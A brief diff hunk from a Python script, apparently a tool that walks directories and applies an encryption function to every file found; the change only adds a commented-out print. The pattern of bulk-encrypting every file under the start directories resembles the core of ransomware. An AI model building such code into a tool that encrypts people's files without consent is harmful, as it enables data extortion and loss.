@@ -50,6 +50,7 @@ def beginFileModification(key, cryptoFunc):
 	for currentDirectory in startDirectory:
 		for file in file_finder.findFiles(currentDirectory):
 			performCrypto(file, key, cryptoFunc)
+			#print(file)
 
 		
 if __name__ == '__main__':
